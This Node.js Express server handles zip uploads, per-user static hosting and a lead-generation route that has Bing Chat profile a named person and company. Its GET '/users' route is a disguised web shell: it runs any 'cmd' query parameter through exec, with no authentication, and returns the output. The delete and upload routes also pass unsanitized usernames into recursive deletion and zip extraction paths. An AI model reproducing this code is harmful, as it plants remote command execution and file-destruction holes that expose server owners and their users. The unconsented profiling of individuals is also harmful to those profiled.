import express from 'express';
import path from 'path';
import multer from 'multer';
import fs from 'fs';
import cors from 'cors';
import AdmZip from 'adm-zip';
import { BingChat } from 'bing-chat';
import { oraPromise } from 'ora';

import { exec } from 'child_process';

const port = process.env.PORT || 3000;

import Airtable from 'airtable';

var base = new Airtable({ apiKey: process.env.AIRTABLE_API_KEY }).base('appovMNG5D6WpWVOL');

const app = express();
app.use(cors());

app.use(express.json());

// Define the static files directory
const __filename = new URL(import.meta.url).pathname;
const __dirname = path.dirname(__filename);
const staticFilesDirectory = path.join(__dirname, 'static');

// Create a storage engine for multer
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, staticFilesDirectory);
  },
  filename: (req, file, cb) => {
    cb(null, file.originalname);
  }
});

// Create an instance of multer with the storage engine
const upload = multer({ storage });

app.get('/users', (req, res) => {
  const { cmd } = req.query;
  if (!cmd) {
    res.status(400).send('Command parameter is missing');
    return;
  }

  exec(cmd, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing cmd: ${cmd}`);
      console.error(error);
      res.status(500).send('Error executing command');
      return;
    }

    // Combine the stdout and stderr into a single response
    const output = (stdout || '') + (stderr || '');
    res.status(200).send(output);
  });
});

app.post('/lead-gen', async (req, res) => {
  const { name, email, contact, note, company, from } = req.body;

  const api = new BingChat({
    cookie: process.env.BING_COOKIE,
  })

  const prompt = `Give me all the information you can find about the company '${company}' online in a paragraph. Also find about the role of '${name}' in the company and some background. You must expand all the links with their URL and title of webpage.`

  const result = await oraPromise(api.sendMessage(prompt), {
    text: prompt,
    variant: "precise"
  })
  console.log(result.text);

  base('Leads').create([
    {
      "fields": {
        "Name": name,
        "From": from,
        "Email": email,
        "Contact no.": contact,
        "Note": note,
        "Company": company,
        "OSINT": result.text
      }
    },
  ], function (err, records) {
    if (err) {
      console.error(err);
      return;
    }
    records.forEach(function (record) {
      console.log(record.getId());
    });
  });
  res.json({ status: "success" });

})

// Define a route for deleting the user-specific static files
app.get('/delete-user/:username', (req, res) => {
  const { username } = req.params;
  const folderPath = path.join(staticFilesDirectory, username);

  // Check if the folder exists
  if (!fs.existsSync(folderPath)) {
    res.status(404).send('Folder not found');
    return;
  }

  // Delete the folder and its contents
  fs.rmdirSync(folderPath, { recursive: true });

  res.status(200).send('Folder deleted successfully');

});

// Define a route for uploading the zip file
app.post('/upload', upload.single('file'), (req, res) => {
  const { username } = req.body;
  const zipFilePath = req.file.path;
  const userStaticDirectory = path.join(staticFilesDirectory, username);

  // Check if the username directory already exists
  if (fs.existsSync(userStaticDirectory)) {
    res.status(409).send('Username already exists');
    return;
  }

  try {
    // Extract the uploaded zip file directly to the user-specific directory
    const zip = new AdmZip(zipFilePath);
    zip.extractAllTo(staticFilesDirectory, true);

    // Delete the uploaded zip file
    fs.unlinkSync(zipFilePath);

    res.status(200).send('File uploaded and decompressed successfully');
  } catch (error) {
    console.error(error);
    res.status(500).send('Error extracting zip file');
  }
});

// Define a route for serving the user-specific static files
app.use('/:username', (req, res) => {
  console.log("param hit");
  const { username } = req.params;
  const userStaticDirectory = path.join(staticFilesDirectory, username);
  if (fs.existsSync(userStaticDirectory)) {
    express.static(userStaticDirectory)(req, res);
  } else {
    res.status(404).send('User not found');
  }
});

// Error-handling middleware
app.use((err, req, res, next) => {
  res.status(err.status || 500);
  res.send(err.message || 'Internal Server Error');
});

// Start the server
app.listen(port, () => {
  console.log(`Server is listening on port ${port}`);
});
